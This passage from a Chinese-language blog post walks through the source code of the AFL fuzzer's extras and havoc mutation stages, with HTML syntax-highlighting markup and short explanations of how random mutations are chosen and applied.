class="number">0</span>; j &lt; MIN(a_extras_cnt, USE_AUTO_EXTRAS); j++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* See the comment in the earlier code; extras are sorted by size. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a_extras[j].len &gt; len - i ||</span><br><span class="line">        !<span class="built_in">memcmp</span>(a_extras[j].data, out_buf + i, a_extras[j].len) ||</span><br><span class="line">        !<span class="built_in">memchr</span>(eff_map + EFF_APOS(i), <span class="number">1</span>, EFF_SPAN_ALEN(i, a_extras[j].len))) &#123;</span><br><span class="line"></span><br><span class="line">      stage_max--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    last_len = a_extras[j].len;</span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf + i, a_extras[j].data, last_len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    stage_cur++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Restore all the clobbered memory. */</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_EXTRAS_AO]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_EXTRAS_AO] += stage_max;</span><br></pre></td></tr></table></figure><h3 id="Havoc-Stage">Havoc Stage</h3><p>havoc是不确定的大变异</p><p>首先，由于splice阶段也会进行havoc，所以要进行区分此时是直接运行的havoc还是splice阶段运行的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">stage_cur_byte = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The havoc stage mutation code is also invoked when splicing files; if the</span></span><br><span class="line"><span class="comment">   splice_cycle variable is set, generate different descriptions and such. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!splice_cycle) &#123;</span><br><span class="line"></span><br><span class="line">  stage_name  = <span class="string">&quot;havoc&quot;</span>;</span><br><span class="line">  stage_short = <span class="string">&quot;havoc&quot;</span>;</span><br><span class="line">  stage_max   = (doing_det ? HAVOC_CYCLES_INIT : HAVOC_CYCLES) *</span><br><span class="line">                perf_score / havoc_div / <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 tmp[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">  perf_score = orig_perf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;splice %u&quot;</span>, splice_cycle);</span><br><span class="line">  stage_name  = tmp;</span><br><span class="line">  stage_short = <span class="string">&quot;splice&quot;</span>;</span><br><span class="line">  stage_max   = SPLICE_HAVOC * perf_score / havoc_div / <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stage_max &lt; HAVOC_MIN) stage_max = HAVOC_MIN;</span><br><span class="line"></span><br><span class="line">temp_len = len;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">havoc_queued = queued_paths;</span><br></pre></td></tr></table></figure><p>接下来是一系列变异循环：</p><p>首先，这里有两个循环，外层循环控制测试运行次数，内层循环控制变异个数</p><p>在内层循环中，通过随机数来选择一种变异策略，策略包括翻转、加减、随机插入等等</p><p>在经过n次随机变异后，再通过<code>common_fuzz_stuff</code> 运行测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">  u32 use_stacking = <span class="number">1</span> &lt;&lt; (<span class="number">1</span> + UR(HAVOC_STACK_POW2));</span><br><span class="line"></span><br><span class="line">  stage_cur_val = use_stacking;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; use_stacking; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (UR(<span class="number">15</span> + ((extras_cnt + a_extras_cnt) ? <span class="number">2</span> : <span class="number">0</span>))) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Flip a single bit somewhere. Spooky! */</span></span><br><span class="line"></span><br><span class="line">        FLIP_BIT(out_buf, UR(temp_len &lt;&lt; <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Set byte to interesting value. */</span></span><br><span class="line"></span><br><span class="line">        out_buf[UR(temp_len)] = interesting_8[UR(<span class="keyword">sizeof</span>(interesting_8))];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Set word to interesting value, randomly choosing endian. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">          *(u16*)(out_buf + UR(temp_len - <span class="number">1</span>)) =</span><br><span class="line">            interesting_16[UR(<span class="keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="number">1</span>)];</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          *(u16*)(out_buf + UR(temp_len - <span class="number">1</span>)) = SWAP16(</span><br><span class="line">            interesting_16[UR(<span class="keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="number">1</span>)]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Set dword to interesting value, randomly choosing endian. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">4</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">          *(u32*)(out_buf + UR(temp_len - <span class="number">3</span>)) =</span><br><span class="line">            interesting_32[UR(<span class="keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="number">2</span>)];</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          *(u32*)(out_buf + UR(temp_len - <span class="number">3</span>)) = SWAP32(</span><br><span class="line">            interesting_32[UR(<span class="keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="number">2</span>)]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Randomly subtract from byte. */</span></span><br><span class="line"></span><br><span class="line">        out_buf[UR(temp_len)] -= <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Randomly add to byte. */</span></span><br><span class="line"></span><br><span class="line">        out_buf[UR(temp_len)] += <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Randomly subtract from word, random endian. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">          *(u16*)(out_buf + pos) -= <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">1</span>);</span><br><span class="line">          u16 num = <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line"></span><br><span class="line">          *(u16*)(out_buf + pos) =</span><br><span class="line">            SWAP16(SWAP16(*(u16*)(out_buf + pos)) - num);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Randomly add to word, random endian. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">          *(u16*)(out_buf + pos) += <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">1</span>);</span><br><span class="line">          u16 num = <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line"></span><br><span class="line">          *(u16*)(out_buf + pos) =</span><br><span class="line">            SWAP16(SWAP16(*(u16*)(out_buf + pos)) + num);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Randomly subtract from dword, random endian. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">4</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">          *(u32*)(out_buf + pos) -= <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">3</span>);</span><br><span class="line">          u32 num = <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line"></span><br><span class="line">          *(u32*)(out_buf + pos) =</span><br><span class="line">            SWAP32(SWAP32(*(u32*)(out_buf + pos)) - num);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Randomly add to dword, random endian. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">4</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">          *(u32*)(out_buf + pos) += <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">3</span>);</span><br><span class="line">          u32 num = <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line"></span><br><span class="line">          *(u32*)(out_buf + pos) =</span><br><span class="line">            SWAP32(SWAP32(*(u32*)(out_buf + pos)) + num);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Just set a random byte to a random value. Because,</span></span><br><span class="line"><span class="comment">           why not. We use XOR with 1-255 to eliminate the</span></span><br><span class="line"><span class="comment">           possibility of a no-op. */</span></span><br><span class="line"></span><br><span class="line">        out_buf[UR(temp_len)] ^= <span class="number">1</span> + UR(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span> ... <span class="number">12</span>: &#123;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Delete bytes. We&#x27;re making this a bit more likely</span></span><br><span class="line"><span class="comment">             than insertion (the next option) in hopes of keeping</span></span><br><span class="line"><span class="comment">             files reasonably small. */</span></span><br><span class="line"></span><br><span class="line">          u32 del_from, del_len;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Don&#x27;t delete too much. */</span></span><br><span class="line"></span><br><span class="line">          del_len = choose_block_len(temp_len - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">          del_from = UR(temp_len - del_len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">          memmove(out_buf + del_from, out_buf + del_from + del_len,</span><br><span class="line">                  temp_len - del_from - del_len);</span><br><span class="line"></span><br><span class="line">          temp_len -= del_len;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp_len + HAVOC_BLK_XL &lt; MAX_FILE) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Clone bytes (75%) or insert a block of constant bytes (25%). */</span></span><br><span class="line"></span><br><span class="line">          u8  actually_clone = UR(<span class="number">4</span>);</span><br><span class="line">          u32 clone_from, clone_to, clone_len;</span><br><span class="line">          u8* new_buf;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (actually_clone) &#123;</span><br><span class="line"></span><br><span class="line">            clone_len  = choose_block_len(temp_len);</span><br><span class="line">            clone_from = UR(temp_len - clone_len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            clone_len = choose_block_len(HAVOC_BLK_XL);</span><br><span class="line">            clone_from = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          clone_to   = UR(temp_len);</span><br><span class="line"></span><br><span class="line">          new_buf = ck_alloc_nozero(temp_len + clone_len);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Head */</span></span><br><span class="line"></span><br><span class="line">          <span class="built_in">memcpy</span>(new_buf, out_buf, clone_to);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inserted part */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (actually_clone)</span><br><span class="line">            <span class="built_in">memcpy</span>(new_buf + clone_to, out_buf + clone_from, clone_len);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">memset</span>(new_buf + clone_to,</span><br><span class="line">                   UR(<span class="number">2</span>) ? UR(<span class="number">256</span>) : out_buf[UR(temp_len)], clone_len);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Tail */</span></span><br><span class="line">          <span class="built_in">memcpy</span>(new_buf + clone_to + clone_len, out_buf + clone_to,</span><br><span class="line">                 temp_len - clone_to);</span><br><span class="line"></span><br><span class="line">          ck_free(out_buf);</span><br><span class="line">          out_buf = new_buf;</span><br><span class="line">          temp_len += clone_len;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">14</span>: &#123;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Overwrite bytes with a randomly selected chunk (75%) or fixed</span></span><br><span class="line"><span class="comment">             bytes (25%). */</span></span><br><span class="line"></span><br><span class="line">          u32 copy_from, copy_to, copy_len;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          copy_len  = choose_block_len(temp_len - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">          copy_from = UR(temp_len - copy_len + <span class="number">1</span>);</span><br><span class="line">          copy_to   = UR(temp_len - copy_len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (UR(<span class="number">4</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (copy_from != copy_to)</span><br><span class="line">              memmove(out_buf + copy_to, out_buf + copy_from, copy_len);</span><br><span class="line"></span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="built_in">memset</span>(out_buf + copy_to,</span><br><span class="line">                        UR(<span class="number">2</span>) ? UR(<span class="number">256</span>) : out_buf[UR(temp_len)], copy_len);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Values 15 and 16 can be selected only if there are any extras</span></span><br><span class="line"><span class="comment">         present in the dictionaries. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">15</span>: &#123;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Overwrite bytes with an extra. */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!extras_cnt || (a_extras_cnt &amp;&amp; UR(<span class="number">2</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* No user-specified extras or odds in our favor. Let&#x27;s use an</span></span><br><span class="line"><span class="comment">               auto-detected one. */</span></span><br><span class="line"></span><br><span class="line">            u32 use_extra = UR(a_extras_cnt);</span><br><span class="line">            u32 extra_len = a_extras[use_extra].len;</span><br><span class="line">            u32 insert_at;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extra_len &gt; temp_len) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            insert_at = UR(temp_len - extra_len + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(out_buf + insert_at, a_extras[use_extra].data, extra_len);</span><br><span class="line"></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* No auto extras or odds in our favor. Use the dictionary. */</span></span><br><span class="line"></span><br><span class="line">            u32 use_extra = UR(extras_cnt);</span><br><span class="line">            u32 extra_len = extras[use_extra].len;</span><br><span class="line">            u32 insert_at;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extra_len &gt; temp_len) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            insert_at = UR(temp_len - extra_len + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(out_buf + insert_at, extras[use_extra].data, extra_len);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span 